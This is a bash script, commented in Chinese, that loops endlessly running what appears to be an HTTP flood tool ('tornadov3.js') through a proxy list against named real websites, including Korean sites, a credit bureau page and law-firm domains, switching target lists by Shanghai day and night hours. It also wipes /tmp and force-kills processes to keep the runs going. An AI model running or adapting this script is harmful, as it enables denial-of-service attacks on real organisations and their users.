#!/bin/bash

# ------------------- 配置 -------------------
log_dir="tmp"
mkdir -p "$log_dir"

MAX_MEM_USAGE=80
MAX_DISK_USAGE=95
MAX_LOG_SIZE_MB=1
wait_between_targets=3
wait_between_loops=3
running=true

# ------------------- 信号捕获 -------------------
trap 'echo "🛑 捕获中断，终止中..."; running=false; pkill -TERM -g $$; exit 0' SIGINT

# ------------------- 工具函数 -------------------
get_mem_usage() {
    free | awk '/Mem:/ { printf("%.0f", $3/$2 * 100.0) }'
}

get_disk_usage() {
    df / | awk 'NR==2 {print $5}' | sed 's/%//'
}

free_memory() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ⚠️ 清理内存与 swap..."
    sync
    echo 3 > /proc/sys/vm/drop_caches
    swapoff -a && swapon -a
    pgrep -f Xvfb | xargs -r kill -9 2>/dev/null
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ✅ 内存清理完成"
}

clean_large_logs() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] 🗑 清理tmp..."
    rm -rf /tmp
    mkdir /tmp 
    chmod 777 /tmp
}

# ------------------- 任务批次 -------------------
day_commands=(
    "node tornadov3.js GET 'https://kode24.co.kr/' 120 100 64 proxy.txt --query 1 --debug"
    "node tornadov3.js GET 'https://newdobak.com/?ckattempt=1' 120 100 64 proxy.txt --query 1 --debug"
    "node tornadov3.js GET 'https://www.credit.co.kr/ib20/mnu/BZWMAN00001' 120 100 64 proxy.txt --query 1 --debug"
)


night_commands=(
    "node tornadov3.js GET 'https://int-legal-assist.com/' 120 100 64 proxy.txt --query 1 --debug"
    "node tornadov3.js GET 'https://www.barristrin-law.com/' 120 100 64 proxy.txt --query 1 --debug"
    "node tornadov3.js GET 'https://titanxo.com/sb' 120 100 64 proxy.txt --query 1 --debug"
)

# ------------------- 主循环 -------------------
echo "[$(date +'%Y-%m-%d %H:%M:%S')] 初始化完成，开始轮询..."

while $running; do
    hour=$(TZ=Asia/Shanghai date +%H)

    if (( hour >= 10 && hour < 23 )); then
        commands=("${day_commands[@]}")
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] ☀️ 白天任务 (10:00~23:00)"
    else
        commands=("${night_commands[@]}")
        echo "[$(date +'%Y-%m-%d %H:%M:%S')] 🌙 夜间任务 (23:00~10:00)"
    fi

    for cmd in "${commands[@]}"; do
        if ! $running; then echo "🚪 检测到中断，退出..."; exit 0; fi

        disk_usage=$(get_disk_usage)
        if (( disk_usage >= MAX_DISK_USAGE )); then
            echo "🚨 磁盘使用率 ${disk_usage}%，跳过并清理日志"
            clean_large_logs
            sleep 30
            continue
        fi

        mem_usage=$(get_mem_usage)
        if (( mem_usage >= MAX_MEM_USAGE )); then
            free_memory
        fi

        clean_name=$(echo "$cmd" | grep -oP "(https?://[^/]+)" | sed 's~https\?://~~; s~/~-~g')
        log_file="${log_dir}/${clean_name}.log"

        echo "[$(date +'%Y-%m-%d %H:%M:%S')] ▶️ 执行 $cmd" | tee -a "$log_file"

        setsid timeout --preserve-status -s INT --kill-after=5 150 bash -c "$cmd" >> "$log_file" 2>&1

        pkill -9 -f "node" 2>/dev/null
        pgrep -f Xvfb | xargs -r kill -9 2>/dev/null

        if ! $running; then echo "🚪 中断退出中..."; exit 0; fi

        echo "[$(date +'%Y-%m-%d %H:%M:%S')] ✅ 完成: $cmd，休息 ${wait_between_targets}s" | tee -a "$log_file"
        sleep "$wait_between_targets"
    done

    echo "[$(date +'%Y-%m-%d %H:%M:%S')] ♻️ 本轮完成，等待 ${wait_between_loops}s..."
    clean_large_logs
    free_memory
    sleep "$wait_between_loops"
done
